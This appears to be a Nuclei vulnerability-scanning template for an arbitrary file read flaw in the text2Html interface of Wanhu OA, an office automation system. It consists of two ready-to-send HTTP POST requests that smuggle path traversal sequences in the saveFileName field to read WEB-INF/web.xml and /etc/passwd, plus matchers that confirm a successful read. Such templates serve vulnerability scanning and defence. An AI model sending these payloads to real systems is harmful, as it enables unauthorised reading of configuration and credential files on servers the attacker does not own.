id: wanhuOA-text2Html-read-file

info:
  name: 万户OA text2Html接口存在任意文件读取漏洞
  author: cnaq 
  severity: critical
  description: 万户OA text2Html接口存在任意文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7OA%20text2Html%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: wanhu,OA,file,upload

requests:
  - raw:
      - | # windows
        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
        Connection: close
        Content-Length: 63
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        SL-CE-SUID: 1081

        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html

      - | #linux
        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
        Connection: close
        Content-Length: 63
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        SL-CE-SUID: 1081

        saveFileName=123456/../../../../etc/passwd&moduleName=html

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and

      - type: regex
        regex:
          - "root:.*:0:0:"